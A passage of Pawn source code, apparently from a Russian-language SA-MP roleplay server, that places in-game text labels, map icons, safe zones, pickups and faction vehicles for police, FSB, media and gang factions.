	CreateDynamic3DTextLabel("Ломбард\n{AFAFAF}Для продажи\nоткройте инвентарь и\nвыберите нужный предмет",COLOR_GREEN,197.5494,490.0202,11.9900,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1,-1);
	CreateDynamic3DTextLabel("Справочная\n{AFAFAF}Встаньте на пикап",COLOR_GREEN,1198.2128,-609.9985,998.0313,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1,-1);
	CreateDynamic3DTextLabel("Пульт DJ\n{AFAFAF}Введите: /dj",COLOR_GREEN,-201.2533,856.0426,2613.6101,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1,-1);
	CreateDynamic3DTextLabel("Обменник",COLOR_WHITE,278.3518,1666.6427,12.4625,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1,-1);

	//иконки
	CreateDynamicMapIcon(787.2955,500.0397,12.0135, 36, 0, -1, -1, -1, 1500);//Лесопилка
	CreateDynamicMapIcon(2306.8242,1741.4094,1.7617, 38, 0, -1, -1, -1, 1500);//Шахта
	CreateDynamicMapIcon(437.1599,1560.2333,12.9474, 22, 0, -1, -1, -1, 1500);//Болька
	CreateDynamicMapIcon(1912.2400,2227.6116,16.0831, 55, 0, -1, -1, -1, 1500);//Автошкола
	CreateDynamicMapIcon(2571.3179,-2407.5088,22.9832, 30, 0, -1, -1, -1, 1500);//Автошкола
	CreateDynamicMapIcon(-881.8564,1180.4720,10.5098, 51, 0, -1, -1, -1, 1500);//Дально
	CreateDynamicMapIcon(1850.3457,2035.1680,16.9742, 43, 0, -1, -1, -1, 1500);//Банк1
	CreateDynamicMapIcon(2376.6753,-2139.2605,22.0776, 43, 0, -1, -1, -1, 1500);//Банк2
	CreateDynamicMapIcon(62.9153,843.3816,12.1716, 43, 0, -1, -1, -1, 1500);//Банк3
	CreateDynamicMapIcon(445.7231,1008.4907,12.1405, 55, 0, -1, -1, -1, 1500);//БУ

	AreaInfo[arGreenZone][0] = CreateDynamicSphere(-517.8265,916.6311,25.4395,100.0,-1,-1); // ЖД Вокзал 1
	AreaInfo[arGreenZone][1] = CreateDynamicSphere(1066.2649,103.1860,1049.7478,130.0,-1,-1); // Автошкола (интерьер)
	AreaInfo[arGreenZone][2] = CreateDynamicSphere(1198.0309,-598.4382,1002.3564,150.0,-1,-1); // Болька
	AreaInfo[arGreenZone][3] = CreateDynamicSphere(653.0839,420.8640,12.0000,40.0,-1,-1); // ЖД Вокзал 2
	AreaInfo[arGreenZone][4] = CreateDynamicSphere(13.1801,1646.8998,2010.3943,60.0,-1,-1); // Полиция
	AreaInfo[arGreenZone][5] = CreateDynamicSphere(2010.8218,2740.8726,19.7947,50.0,1,3); // Автосалон Эконом
	AreaInfo[arGreenZone][6] = CreateDynamicSphere(-80.3032,461.1355,3013.1499,60.0,-1,-1); // СМИ ритм
	AreaInfo[arGreenZone][7] = CreateDynamicSphere(126.9402,1361.0530,1002.9600,60.0,-1,-1); // Университет
	AreaInfo[arGreenZone][8] = CreateDynamicSphere(2177.9104, -2348.7549, 1002.0000,100.0,-1,-1); // Деморган
	AreaInfo[arGreenZone][9] = CreateDynamicSphere(-930.6042,855.7810,2512.9500,30.0,-1,-1); // Мэрия
//	AreaInfo[arGreenZone][10] = CreateDynamicSphere(526.2593,674.9232,3591.59911,100.0,-1,-1); // Банк
	AreaInfo[arGreenZone][11] = CreateDynamicSphere(1690.1354,2068.0659,-7.8350,60.0,-1,-1); // Казино
	AreaInfo[arGreenZone][12] = CreateDynamicSphere(324.4371, -182.2243, 2522.8335,80.0,-1,-1); // ГУВД
	AreaInfo[arGreenZone][13] = CreateDynamicSphere(833.6812,501.2223,12.0318,100.0,-1,-1); // Лесопилка
	AreaInfo[arGreenZone][14] = CreateDynamicSphere(2312.6340,1758.6198,1.7617,70.0,-1,-1); // Шахта
	AreaInfo[arGreenZone][15] = CreateDynamicSphere(1580.9441,1449.0463,455.9069,100.0,6,0,-1); // Шахта инт
	AreaInfo[arGreenZone][16] = CreateDynamicSphere(1840.1278,1607.4762,1021.7215,150.0,6,5); // армия инт
	AreaInfo[arGreenZone][17] = CreateDynamicSphere(-5.1843,502.3203,11.2477,50.0,4,1); // Автосалон Люкс
	AreaInfo[arGreenZone][18] = CreateDynamicSphere(467.7257,997.4965,11.9993,30.0,-1,-1); // БУ
	AreaInfo[arGreenZone][19] = CreateDynamicSphere(-2625.9517,210.8517,4.6152,30.0,-1,-1); // свободно
	AreaInfo[arGreenZone][20] = CreateDynamicSphere(-97.5576,986.8341,12123.7537,20.0,-1,-1); // Гонки
	AreaInfo[arGreenZone][21] = CreateDynamicSphere(2571.4700,-2367.2839,22.9559,20.0,-1,-1); // свободно
	AreaInfo[arGreenZone][22] = CreateDynamicSphere(-2662.0498,630.9210,14.4531,35.0,-1,-1); // свободно
	AreaInfo[arGreenZone][23] = CreateDynamicSphere(1607.5980,1835.7625,10.9375,30.0,-1,-1); // свободно
	AreaInfo[arGreenZone][24] = CreateDynamicSphere(-2554.6284,1268.0020,13.5151,500.0,-1,-1); // пилот
	AreaInfo[arGreenZone][25] = CreateDynamicSphere(113.3621,-769.4016,1006.1030,300.0,-1,-1); // деморган /prison
	  //
	AreaInfo[arBuyNarko][0] = CreateDynamicSphere(412.1119,966.0861,12.5516,1.0);
	AreaInfo[arBuyNarko][1] = CreateDynamicSphere(518.3177,905.5228,0.6400,1.0);

	AreaInfo[arLeaveJob][0] = CreateDynamicSphere(833.6812,501.2223,12.0318,100.0,-1,-1);
	AreaInfo[arLeaveJob][1] = CreateDynamicSphere(1580.9441,1449.0463,455.9069,100.0,6,0,-1);
	AreaInfo[arLeaveJob][2] = CreateDynamicSphere(-824.2582,-1120.9108,45.5583,300.0,6,0,-1);

	CreatePickup(1578,1,518.3177,905.5228,0.6400);
	CreateDynamic3DTextLabel("Наркопритон\n\n{FFFFFF}Стоимость травы: {FFFF00}1 пакетик - 40р",0xFFFF00FF,518.3177,905.5228,0.6400,10.0);

	/* АРМИЯ */
	AreaInfo[arLoadPatr] = CreateDynamicSphere(-2346.0098,666.8982,5.5424,2.0); // склад армии (загрузка)
	CreatePickup(19134,1,-2346.0098,666.8982,5.5424);
	CreateDynamic3DTextLabel("Загрузка патронов\n{bbbbbb}Используйте 'H'",0xFFFFFFFF, -2346.0098,666.8982,5.5424,10.0); // завод

	AreaInfo[arArmyAmmo] = CreateDynamicSphere(131.3471,2932.4998,7.6221,2.0); // склад армии (разгрузка)
	CreatePickup(19134,1,131.3471,2932.4998,7.6221,0);
	CreateDynamic3DTextLabel("Разгрузка патронов\n{bbbbbb}Используйте 'H'",0xFFFFFFFF, 131.3471,2932.4998,7.6221,10.0);

	armyammo = CreateDynamicCP(114.8410,2938.0264,7.6293,1.0); // тут выдача патронов армейцам
	gArmyWarehouseText = CreateDynamic3DTextLabel("_",0xFFFFFFFF,114.8410,2938.0264,7.6293,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,0); // 3D текст
	UpdateArmyAmmo();

	armshield = CreatePickup(1242, 23, 117.7983,2937.6899,7.6293, 0); // бронежилет
	armystol = CreatePickup(1582, 23, 1831.3076,1624.1836,1021.7237, 0); // Еда
	armskin = CreatePickup(1275,23,1839.0582,1606.3627,1021.7215,0); // гардероб

	/* КОНЕЦ АРМИИ*/

	gGunWorkWHText[0] = CreateDynamic3DTextLabel("_",0xFFFF00FF,132.3752,1857.3159,-18.3955,25);
	gGunWorkWHText[1] = CreateDynamic3DTextLabel("_",0xFFFF00FF,836.4863,522.6376,13.3132,25);
	gGunWorkWHText[2] = CreateDynamic3DTextLabel("_",0xFFFF00FF,826.7345,482.5340,13.3132,25);
	UpdateWood();
	LessdrovText[0] = CreateDynamic3DTextLabel("_",0xFFFF00FF,906.7739,473.5260,11.9989,25);
	UpdateWood2();
	gGunWorkMinerText[0] = CreateDynamic3DTextLabel("_",0xFFFF00FF,2317.3662,1738.8253,1.9040,25);
	gGunWorkMinerText[1] = CreateDynamic3DTextLabel("_",0xFFFF00FF,2317.7971,1733.9974,1.9027,25);
	gGunWorkMinerText[2] = CreateDynamic3DTextLabel("_",0xFFFF00FF,1611.7820,1444.3751,455.9069,25);
	UpdateMiner();

	CreateDynamic3DTextLabel("Место разгрузки",0xFFFFFFFF,276.4383,2829.0493,1.7600,10.0);//РМ
	AreaInfo[arItMaAmmo] = CreateDynamicSphere(-700.0852,-1570.9918,41.0009,1.0);
	CreatePickup(19134,1,-700.0852,-1570.9918,41.0009,0);
	CreateDynamic3DTextLabel("Место разгрузки",0xFFFFFFFF,-700.0852,-1570.9918,41.0009,10.0);//ИМ
	AreaInfo[arRuMaAmmo] = CreateDynamicSphere(-2601.6238,2911.9094,41.5525,1.0);
	CreatePickup(19134,1,-2601.6238,2911.9094,41.5525,0);
	CreateDynamic3DTextLabel("Место разгрузки",0xFFFFFFFF,-2601.6238,2911.9094,41.5525,10.0);//РМ
	AreaInfo[arEuroSeti] = CreateDynamicSphere(187.5009,2268.6997,1001.5000,1.0);
	CreatePickup(1239,1,187.5009,2268.6997,1001.5000);
	CreateDynamic3DTextLabel("Евросеть\n{AFAFAF}Встаньте на пикап",COLOR_GREEN,187.5009,2268.6997,1001.5000,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
	AreaInfo[arUnivTest] = CreateDynamicSphere(126.9402,1361.0530,1002.9600,1.0);
	CreatePickup(1239, 23, 441.6971,-76.2711,3002.0000, -1); // - Пикап в Евросети
	CreateDynamic3DTextLabel("Получение номеров\n{cecece}(Нажмите ALT)", 0xffd83dFF, 441.6971,-76.2711,3002.0000, 5.0);
	CreatePickup(2894,1,126.9402,1361.0530,1002.9600);
	CreateDynamic3DTextLabel("Сдача экзамена\n{AFAFAF}Встаньте на пикап",COLOR_GREEN,126.9402,1361.0530,1002.9600,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
	AreaInfo[arArhTest] = CreateDynamicSphere(131.9515,1368.7344,1002.9600,1.0);
	CreatePickup(19134, 23, 1067.7772,110.9629,1049.7478, -1);
	CreateDynamic3DTextLabel("Сдача теста на вождение\n{cecece}(Нажмите ALT)", 0xffd83dFF, 1067.7772,110.9629,1049.7478, 5.0);

	AreaInfo[arPoliciaA] = CreateDynamicSphere(593.7042,-2.6143,1022.9027,1.0);
	CreatePickup(1239,1,593.7042,-2.6143,1022.9027);
	AreaInfo[arPoliciaB] = CreateDynamicSphere(414.3755,62.8211,989.7030,1.0);
	CreatePickup(1239,1,414.3755,62.8211,989.7030);

	/*AreaInfo[arInfoIce] = CreateDynamicSphere(186.4058,838.3613,12.1526,1.0);
	CreatePickup(1239,1,186.4058,838.3613,12.1526);*/

	AreaInfo[arArendBall] = CreateDynamicSphere(487.6667,1754.8655,12.0100,1.0);
	CreatePickup(19134,1,487.6667,1754.8655,12.0100);

	CreateDynamic3DTextLabel("Полёт на воздушном шаре",COLOR_BLUE,487.6667,1754.8655,12.0100+1.0,15.0);

	//AreaInfo[arBuyCopter] = CreateDynamicSphere(649.7111,654.0049,12.4325,1.0);
	//CreatePickup(19134,1,649.7111,654.0049,12.4325);

	//CreateDynamic3DTextLabel("Покупка вертолета",COLOR_BLUE,649.7111,654.0049,12.43251+1.0,15.0);

	//CreateDynamic3DTextLabel("{FFFF00}ООО \"Айсберг\"\n\n{FFFFFF}Владелец: {99cc00}Kirill_Putbulll",COLOR_BLUE,186.4058,838.3613,12.1526+1.0,15.0);

	CreateDynamic3DTextLabel("Устройство на работу\n{AFAFAF}Встаньте на маркер",COLOR_GREEN,359.4072,165.7762,1008.3828,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1,3);

    CreateDynamic3DTextLabel("{FF0000}ЗАГС\n{FFFFFF}/wedding - пожениться\n/divorce - развестись\n/offdivorce - развестись оффлайн",0xFFFFFFFF,105.0641,2895.8247,1010.6396,5.0);//Загс
    CreateDynamic3DTextLabel("Место загрузки продуктов\n{bbbbbb}Используйте сигнал",0xFFFFFFFF,-940.8591,1221.7819,10.5293+2,25);//завод
    //CreateDynamic3DTextLabel("{FFFFFF}С Праздником{FF0000} 8 МАРТА\n{FFFFFF}наших девушек сервера",0xFFFFFFFF,-686.0518,943.7344,12.1600,10.0);//праздник

	tPickup[4] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,2637.5366,-1414.3035,270.7800,50.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1,-1);
	tPickup[6] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,-940.6257,1221.7030,10.8205,50.0);

	CreateDynamic3DTextLabel("{FFFFFF}Место для работы\n{37c268}Используйте ЛКМ", 0xFFFFFFF, 876.634155, 496.188629, 12.7175, 10.0);
	CreateDynamic3DTextLabel("{FFFFFF}Место для работы\n{37c268}Используйте ЛКМ", 0xFFFFFFF, 882.514221, 489.598571, 12.7175, 10.0);
	CreateDynamic3DTextLabel("{FFFFFF}Место для работы\n{37c268}Используйте ЛКМ", 0xFFFFFFF, 870.965087, 481.265289, 12.7175, 10.0);
	CreateDynamic3DTextLabel("{FFFFFF}Место для работы\n{37c268}Используйте ЛКМ", 0xFFFFFFF, 873.699157, 474.002349, 12.7175, 10.0);
	CreateDynamic3DTextLabel("{FFFFFF}Место для работы\n{37c268}Используйте ЛКМ", 0xFFFFFFF, 880.718688, 468.086120, 12.7175, 10.0);
	CreateDynamic3DTextLabel("{FFFFFF}Место для работы\n{37c268}Используйте ЛКМ", 0xFFFFFFF, 872.184631, 466.289550, 12.7175, 10.0);
	CreateDynamic3DTextLabel("{FFFFFF}Место для работы\n{37c268}Используйте ЛКМ", 0xFFFFFFF, 864.510620, 463.272277, 12.7175, 10.0);
	CreateDynamic3DTextLabel("{FFFFFF}Место для работы\n{37c268}Используйте ЛКМ", 0xFFFFFFF, 864.750915, 479.531494, 12.7175, 10.0);

	CreateDynamic3DTextLabel("Посадить преступника\nВведите: '/arrest'", 0xFFFFFFFF, -279.6595,547.2475,12.7912+0.3, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1);
	CreateDynamic3DTextLabel("Посадить преступника\nВведите: '/arrest'", 0xFFFFFFFF, 2558.5093,-2416.2666,21.9690+0.3, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1);

	//cPickup[1] = CreatePickup(19134, 23, 1120.5834,1562.6920,2316.2300, 1); // Высший кл
	//cPickup[2] = CreatePickup(19134, 23, 1120.5834,1562.6920,2316.2300, 3); // АС Вело мото
	//Prazdnik = CreatePickup(19134, 23, -686.0518,943.7344,12.1600, 0); // праздник
	Pickup[0] = CreatePickup(19134, 23, 627.5513,-21.0185,3002.8833, -1); // АС Эконом
	Pickup[1] = CreatePickup(19134, 23, 2541.5745,2350.6289,2337.4524, -1); //спецназ раздевалка
	Pickup[2] = CreatePickup(19134, 23, 601.5739,9.0576,1022.9027, 0); //ППС склад
	Pickup[3] = CreatePickup(19134, 23, 451.6751,-79.9327,3002.0000, 0); // Оружейка ДПС
	Pickup[4] = CreatePickup(353,23, -2463.0393,-2322.4451,1002.0000,0); //ФСБ Оружейка
	Pickup[5] = CreatePickup(353,23, 1188.3813,2664.3438,-17.5041,0);
	Pickup[6] = CreatePickup(2894, 23, 1060.8469,112.8555,1049.7478, -1); // ПДД
	Pickup[7] = CreatePickup(1275, 23, 2541.5620,2353.4299,2337.4524, -1); // Раздевалка swat
	Pickup[8] = CreatePickup(1275, 23, 598.5961,6.2900,1022.9027, 0); // Раздевалка ППС
	Pickup[9] = CreatePickup(1275, 23, 448.3801,-79.7198,3002.0000, 0); // Раздевалка ДПС
	Pickup[11] = CreatePickup(1239, 23, 1985.5739,1908.5031,1338.2651, -1); //центр занятости
	/*Pickup[12] = CreatePickup(19134, 23, 506.5644,-86.3119,997.9609, -1);
	Pickup[13] = CreatePickup(19134, 23, 489.7846,-81.6869,997.9578, -1);
	Pickup[14] = CreatePickup(19134, 23, 509.0951,-84.4070,997.9609, -1);
	Pickup[15] = CreatePickup(19134, 23, 509.0951,-85.4056,997.9609, -1);
	Pickup[16] = CreatePickup(19134, 23, 511.1303,-84.3520,997.9609, -1);
	Pickup[17] = CreatePickup(19134, 23, 511.1303,-85.2946,997.9609, -1);
	Pickup[18] = CreatePickup(19134, 23, 510.1202,-83.3744,997.9609, -1);*/
	Pickup[19] = CreatePickup(19134, 23, -896.3942,837.7071,2512.9500, -1);
	Pickup[20] = CreatePickup(19134, 23, -901.7783,846.4376,2512.9500, 0); //бизнес центр
	Pickup[21] = CreatePickup(19134, 23, 278.3518,1666.6427,12.4625, 0);
	Pickup[22] = CreatePickup(1275, 23,-899.5281,837.8275,2512.9500, 0); // Раздевалка pravo
	Pickup[23] = CreatePickup(1275, 23, 1192.1246,-614.4327,1001.7578, 0); // Раздевалка medic
	Pickup[24] = CreatePickup(1275, 23, 140.0285,1381.5061,1002.9600, -1); // Раздевалка ASH
	Pickup[25] = CreatePickup(1275, 23, 251.8025,-184.7001,3003.3940, 0); // Раздевалка SMI
	Pickup[26] = CreatePickup(19134, 23, 131.4093,1368.7843,1002.9600, 0); // Универ
	Pickup[27] = CreatePickup(19134, 23, 111.9117,2937.7881,7.6293, -1); //оружие армий
	/*narkoenter[1] = CreatePickup(1318,23,409.1382,967.3489,12.5516);//наркопритон вход
	narkoenter[0] = CreatePickup(1318,23,532.3232,907.7461,3.2231);//наркопритон выход*/
	bankpalomino[0] = CreatePickup(1318,23,2303.3384,-16.1465,2600.4844);//необочий +00
	bankpalomino[1] = CreatePickup(1318,23,1458.5571,-1010.9435,3400.4459,4);//необочий +00
	gunsklad[0] = CreateDynamicCP(2567.5823,-1847.7286,2522.8401,1.0,-1,-1); // Grove ган
	gunsklad[1] = CreateDynamicCP(2567.5823,-1847.7286,2522.8401,1.0,2,2); // Ballas ган
	gunsklad[2] = CreateDynamicCP(2567.5823,-1847.7286,2522.8401,1.0,3,3); // Rifa ган
	gunsklad[3] = CreateDynamicCP(2567.5823,-1847.7286,2522.8401,1.0,4,4); // Aztecas ган
	gunsklad[4] = CreateDynamicCP(2567.5823,-1847.7286,2522.8401,1.0,6,6); // Vagos ган
	gunsklad[5] = CreateDynamicCP(470.7443,-349.4612,1016.4385,1.0,5,5); // ОПГ Подольское
	gunsklad[6] = CreateDynamicCP(632.2433,10.1143,1173.6394,1.0,5,5); // Yakuza ган
	gunsklad[7] = CreateDynamicCP(614.2426,-1.1390,1174.4821,1.0,3,5); // RM ган
	sitsklad[0] = CreateDynamicCP(-93.7238,472.4840,3013.1499,1.0,0,0); // сми сейф
	sitsklad[1] = CreateDynamicCP(-932.7482,825.4486,2511.7200,1.0,0,0); // право склад
	fbipic[0] = CreatePickup(1242,23,-2465.0229,-2322.3025,1002.0000,-1); // Бронник
	fbipic[1] = CreatePickup(1275,23,-2466.0095,-2319.2629,1002.0000,-1); // FBI гардероб

	WHDataUpdate(); // сохраняет информацию складов мафий
	//Пикапы устройств

	Mafia3d[0] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,470.7443,-349.4612,1016.4385,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1); //Итальянская
	Mafia3d[1] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,612.0229,-2.9871,1174.4821,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1); //Русская

	nBank3d[0] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,-93.7238,472.4840,3013.1499,6.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,0);
	nBank3d[1] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,-932.7482,825.4486,2511.7200,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,0);

	Gang3d[0] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,2567.5425,-1847.9023,2522.8401,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1); //ОПГ Тамбовское
	Gang3d[1] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,-2626.1074,2915.4783,2738.6201,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1); //ОПГ Подольское
	//Gang3d[2] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,2567.1943,-1848.8025,2523.1179,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,3,3);
	//Gang3d[3] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,2567.1943,-1848.8025,2523.1179,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,4,4);
	//Gang3d[4] = CreateDynamic3DTextLabel("_",0xFFFFFFFF,2567.1943,-1848.8025,2523.1179,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);

	GetMedicines[0] = CreatePickup(1239,23,1194.6727,-614.6089,1001.7578,4);
	GetMedicines[1] = CreatePickup(1239,23,327.1456,1536.4348,1084.1450,5);
	GetMedicines[2] = CreatePickup(1239,23,327.1456,1536.4348,1084.1450,6);
	CreateDynamic3DTextLabel("Склад медикаментов\n{AFAFAF}Встаньте на пикап",COLOR_GREEN,1191.2878,-577.9361,998.0313,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);

	zavod[0] = CreatePickup(1318,24,-1008.0067,-696.2380,32.0078);
	zavod[1] = CreatePickup(1318,24,2577.3687,-1289.9537,1044.1250);

	//=========================== Спортзалы ====================================
	sportpickup = CreatePickup(1275,23,-339.6125,445.4721,2513.6201);
	//==========================================================================

	//Больница
	bolnicapick[0] = CreatePickup(19133, 23, 437.1599,1560.2333,12.9474,0); //+
	bolnicapick[1] = CreatePickup(19133, 23, 1199.7156,-616.8286,998.0547,4);
	// ОПГ 1
	//opg1pick[0] = CreatePickup(19133, 23, -2812.2852,-670.1646,9.0407,0); //+ ОПГ Тамбовское вход
	//opg1pick[1] = CreatePickup(19133, 23, 2557.4219,-1854.0977,2522.8401,6); // выход
	// Военкомат
	//voenkomatpick[0] = CreatePickup(19133,23,1919.2096,2303.8525,15.5697);
	//voenkomatpick[1] = CreatePickup(19133,23,-572.3914,-193.5459,2552.0200);
	//miner
	minerpick[0] = CreatePickup(1318,23,2306.8242,1741.4094,1.7617,-1);
 	CreateDynamic3DTextLabel("Шахта\n{AFAFAF}Используйте ALT",COLOR_GREEN,2306.8242,1741.4094,1.7617,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1);
	CreateDynamic3DTextLabel("Выход с шахты\n{AFAFAF}Используйте ALT",COLOR_GREEN,1529.9095,1430.2949,456.0407,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1);
	minerpick[1] = CreatePickup(1318,23,1529.9095,1430.2949,456.0407,-1);
    podolcar[0] = AddStaticVehicle(575,-2247.7114,267.8591,24.3646,262.6888,13,13); // гелик для ОПГ Подольское (1)
	podolcar[1] = AddStaticVehicle(489,-2247.4463,271.3346,24.1934,262.6888,13,13); // гелик для ОПГ Подольское (2)
	podolcar[2] = AddStaticVehicle(489,-2247.0449,274.7870,24.1934,262.6888,13,13); // раптер ОПГ Подольское (1)
	podolcar[3] = AddStaticVehicle(436,-2246.6726,278.6157,24.1417,262.6888,13,13); // шкода ОПГ Подольское (1)
	podolcar[4] = AddStaticVehicle(436,-2246.3330,282.5113,24.1413,262.6888,13,13); // шкода ОПГ Подольское (2)
	podolcar[5] = AddStaticVehicle(440,-2245.2930,286.6038,24.2517,262.6888,13,13); // мотик ОПГ Подольское (1)
// podolcar[6] = AddStaticVehicle(521,1895.0580,1092.8629,28.3974,227.1562,136,136); // мотик ОПГ Подольское (2)
// podolcar[7] = AddStaticVehicle(521,1894.8682,1090.8671,28.4204,224.7408,136,136); // мотик ОПГ Подольское (3)
//=======================================================МВД=================================================
	gibddcar[0] = AddStaticVehicle(599,2539.67822,-2441.7521,21.5911,270.00,1,1); // Уаз МВД (1)
	gibddcar[1] = AddStaticVehicle(599,2539.67822,-2438.2009,21.5914,270.00,1,1); // Уаз МВД (2)
	gibddcar[2] = AddStaticVehicle(599,2539.67822,-2434.6230,21.7853,270.00,1,1); // Уаз МВД (3)
	gibddcar[3] = AddStaticVehicle(599,2539.67822,-2430.9667,21.7723,270.00,1,1); // Уаз МВД (4)
	gibddcar[4] = AddStaticVehicle(596,2539.67822,-2427.4470,21.7490,270.00,1,1); // Шкода МВД (5)
	gibddcar[5] = AddStaticVehicle(596,2539.67822,-2423.9584,21.6695,270.00,1,1); // Шкода МВД (6)
	gibddcar[6] = AddStaticVehicle(596,2539.67822,-2420.2802,21.6833,270.00,1,1); // Шкода МВД(7)
	gibddcar[7] = AddStaticVehicle(596,2539.67822,-2416.5568,22.0806,270.00,1,1); // Шкода МВД(8)
	gibddcar[8] = AddStaticVehicle(427,2539.67822,-2413.1154,21.7183,270.00,1,1); // газель МВД(9)
	gibddcar[9] = AddStaticVehicle(427,2539.67822,-2409.7250,21.7335,270.00,1,1); // газель МВД(10)
//======================================================Гибдд=============================================
	gibddcar[10] = AddStaticVehicle(597,-278.1471,556.1134,12.5733,173.9232,1,1); // Фокус ГИБДД
	gibddcar[11] = AddStaticVehicle(597,-274.6691,555.7243,12.6160,174.3971,1,1); // Фокус ГИБДД
	gibddcar[12] = AddStaticVehicle(597,-270.9028,555.4776,12.6596,173.7567,1,1); // Фокус ГИБДД
	gibddcar[13] = AddStaticVehicle(597,-267.2652,555.2154,12.7025,175.3351,1,1); // Фокус ГИБДД
	gibddcar[14] = AddStaticVehicle(598,-263.5077,554.8802,12.7383,175.3759,1,1); // Приора ГИБДД
	gibddcar[15] = AddStaticVehicle(598,-260.1797,554.7259,12.6782,174.9415,1,1); // Приора ГИБДД
	gibddcar[16] = AddStaticVehicle(598,-256.4431,554.4582,12.6914,174.8860,1,1); // Приора ГИБДД
	gibddcar[17] = AddStaticVehicle(598,-252.5975,554.0175,12.6892,174.9593,1,1); // Приора ГИБДД
	gibddcar[18] = AddStaticVehicle(523,-248.5589,553.5333,12.7762,173.0434,1,1); // Мотоцикл ГИБДД
	gibddcar[19] = AddStaticVehicle(523,-245.3000,553.1207,12.8169,172.0240,1,1); // Мотоцикл ГИБДД
	gibddcar[20] = AddStaticVehicle(523,-242.0948,552.8448,12.8605,175.0037,1,1); // Мотоцикл ГИБДД
	gibddcar[21] = AddStaticVehicle(523,-239.3271,552.5905,12.8880,174.4987,1,1); // Мотоцикл ГИБДД
//=======================================================ФСБ=============================================
	fbicar[0] = AddStaticVehicle(551,1941.5568,-2192.6143,11.3177,180.0000,0,0); // Крузак ФСБ
	fbicar[1] = AddStaticVehicle(551,1935.3676,-2192.6143,11.3177,180.0000,0,0); // Крузак ФСБ
	fbicar[2] = AddStaticVehicle(551,1929.5151,-2192.6143,11.3207,180.0000,0,0); // Крузак ФСБ
	fbicar[3] = AddStaticVehicle(551,1923.7858,-2192.6143,11.3200,180.0000,0,0); // Крузак ФСБ
	fbicar[4] = AddStaticVehicle(490,1923.8154,-2184.6396,11.3511,360.0000,0,0); // Кадиллак ФСБ
	fbicar[5] = AddStaticVehicle(490,1929.5524,-2184.6396,11.3490,360.0000,0,0); // Кадиллак ФСБ
	fbicar[6] = AddStaticVehicle(490,1935.4506,-2184.6396,11.3493,360.0000,0,0); // Кадиллак ФСБ
	fbicar[7] = AddStaticVehicle(490,1941.5018,-2184.6396,11.3514,360.0000,0,0);
// Кадиллак ФСБ
	fbicar[8] = AddStaticVehicle(516,1941.5410,-2170.1353,11.0207,180.0000,0,0); // Поло ФСБ
	fbicar[9] = AddStaticVehicle(516,1935.4083,-2170.1353,11.0210,180.0000,0,0); // Поло ФСБ
	fbicar[10] = AddStaticVehicle(516,1929.4879,-2170.1353,11.0220,180.0000,0,0); // Поло ФСБ
	fbicar[11] = AddStaticVehicle(516,1923.7263,-2170.1353,11.0211,180.0000,0,0);// Поло ФСБ
	fbicar[12] = AddStaticVehicle(487,1940.0406,-2158.8472,16.4968,86.8141,0,0); // Вертолёт ФСБ
//=======================================================СМИ"РИТМ"=============================================
	ritmcar[0] = AddStaticVehicle(582,2122.17578,-2467.8801,22.049934,0.00,1,1); // СМИ (1)
	ritmcar[1] = AddStaticVehicle(582,2116.30639,-2467.8801,22.049934,0.00,1,1); // СМИ (2)
	ritmcar[2] = AddStaticVehicle(582,2110.26269,-2467.8801,22.049934,0.00,1,1); // СМИ (3)
	ritmcar[3] = AddStaticVehicle(582,2104.26220,-2467.8801,22.049934,0.00,1,1); // СМИ (4)
	ritmcar[4] = AddStaticVehicle(582,2098.24755,-2467.8801,22.049934,0.00,1,1); // СМИ (5)
	ritmcar[5] = AddStaticVehicle(536,2097.55444,-2435.6833,21.477144,180.00,1,1); // СМИ СМИ Шкода (1)
	ritmcar[6] = AddStaticVehicle(536,2103.45434,-2435.6833,21.477144,180.00,1,1); // СМИ Шкода (2)
	ritmcar[7] = AddStaticVehicle(536,2109.60229,-2435.6833,21.477144,180.00,1,1); // СМИ Шкода (3)
	ritmcar[8] = AddStaticVehicle(536,2115.60229,-2435.6833,21.477144,180.00,1,1); // СМИ Шкода (4)
//==================================================ОПГ Тамбовское=============================================
	tambcar[0] = AddStaticVehicle(421,1932.85412,2170.26831,15.472859,270.0,0,0); // кабан (1) ОПГ Тамбовское
	tambcar[1] = AddStaticVehicle(421,1932.85412,2173.71948,15.472859,270.0,0,0); // кабан (2) ОПГ Тамбовское
	tambcar[2] = AddStaticVehicle(579,1947.08654,2167.95336,15.472859,90.0,0,0); // Гелик ОПГ Тамбовское
	tambcar[3] = AddStaticVehicle(579,1947.39270,2164.20581,15.472859,90.0,0,0); // Гелик (1) ОПГ Тамбовское
	tambcar[4] = AddStaticVehicle(418,1952.36980,2172.81201,15.472859,90.0,0,0); // Спринер ОПГ Тамбовское
